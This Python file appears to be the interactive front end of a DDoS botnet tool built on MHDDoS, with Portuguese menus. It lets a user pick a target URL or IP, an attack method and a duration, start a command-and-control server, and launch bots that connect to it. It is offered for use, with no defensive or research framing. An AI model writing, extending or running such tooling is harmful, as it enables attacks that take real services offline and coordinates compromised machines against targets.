from orchestrator.attack import list_attack_methods
from orchestrator.orchestrator import orchestrator
from orchestrator.c2_server import server
from orchestrator.bot import bot

def display_help():
    help_text = """
    Orquestrador de DDoS com MHDDoS.

    Como usar:
      1. Listar métodos de ataque: Escolha 'Ataques' no menu e depois 'Listar métodos de ataque'.
      2. Iniciar ataque DDoS: Escolha 'Ataques' no menu e depois 'Iniciar ataque DDoS'.
      3. Iniciar servidor C&C: Escolha 'Ferramentas' no menu e depois 'Iniciar servidor C&C'.
      4. Iniciar bot: Escolha 'Ferramentas' no menu e depois 'Iniciar bot'.

    Exemplos de uso direto (sem menu):
      Listar métodos de ataque: python script.py list
      Iniciar ataque DDoS: python script.py attack <alvo> <método> <duração>
      Iniciar servidor C&C: python script.py server --host <endereço> --port <porta>
      Iniciar bot: python script.py bot <IP do servidor> <porta do servidor>
    """
    print(help_text)

def list_methods():
    methods = list_attack_methods()
    print("Métodos de ataque disponíveis:")
    for idx, method in enumerate(methods, 1):
        print(f"{idx}. {method}")
    return methods

def start_attack():
    target = input("Alvo do ataque (URL ou IP): ")
    methods = list_methods()
    method_index = int(input("Escolha o número do método de ataque: ")) - 1
    method = methods[method_index]
    duration = int(input("Duração do ataque em segundos: "))
    options = input("Opções adicionais para o ataque (separadas por espaço, ou deixe em branco): ").split()
    print(f"Iniciando ataque DDoS ao alvo {target} usando o método {method} por {duration} segundos.")
    if options:
        print(f"Opções adicionais: {' '.join(options)}")
    orchestrator(target, method, duration, options)  # Chamada com 4 argumentos

def start_server():
    host = input("Endereço do servidor C&C (padrão: 0.0.0.0): ") or '0.0.0.0'
    port = int(input("Porta do servidor C&C (padrão: 9999): ") or 9999)
    print(f"Iniciando servidor de C&C no endereço {host}:{port}.")
    server(host, port)

def start_bot():
    server_ip = input("IP do servidor de C&C: ")
    server_port = int(input("Porta do servidor de C&C: "))
    print(f"Iniciando bot conectado ao servidor C&C em {server_ip}:{server_port}.")
    bot(server_ip, server_port)

def attacks_menu():
    while True:
        print("\nAtaques:")
        print("1. Listar métodos de ataque")
        print("2. Iniciar ataque DDoS")
        print("99. Voltar")
        attack_choice = input("Escolha uma opção: ")
        if attack_choice == '1':
            list_methods()
        elif attack_choice == '2':
            start_attack()
        elif attack_choice == '99':
            break
        else:
            print("Opção inválida.")

def tools_menu():
    while True:
        print("\nFerramentas:")
        print("1. Iniciar servidor C&C")
        print("2. Iniciar bot")
        print("99. Voltar")
        tool_choice = input("Escolha uma opção: ")
        if tool_choice == '1':
            start_server()
        elif tool_choice == '2':
            start_bot()
        elif tool_choice == '99':
            break
        else:
            print("Opção inválida.")

def main():
    print("""  
[40m[35m  __  __ _       _                       _     _           [0m[40m
[40m[35m |  \/  (_)_ __ (_) ___  _ __  ___    __| | __| | ___  ___ [0m[40m
[40m[35m | |\/| | | '_ \| |/ _ \| '_ \/ __|  / _` |/ _` |/ _ \/ __|[0m[40m
[40m[35m | |  | | | | | | | (_) | | | \__ \ | (_| | (_| | (_) \__ \[0m[40m
[40m[35m |_|  |_|_|_| |_|_|\___/|_| |_|___/  \__,_|\__,_|\___/|___/[0m[40m""")
    while True:
        print("\nMenu:")
        print("1. Help")
        print("2. Ataques")
        print("3. Ferramentas")
        print("99. Sair")
        choice = input("Escolha uma opção: ")

        if choice == '1':
            display_help()
        elif choice == '2':
            attacks_menu()
        elif choice == '3':
            tools_menu()
        elif choice == '99':
            print("Saindo...")
            break
        else:
            print("Opção inválida.")

if __name__ == "__main__":
    main()
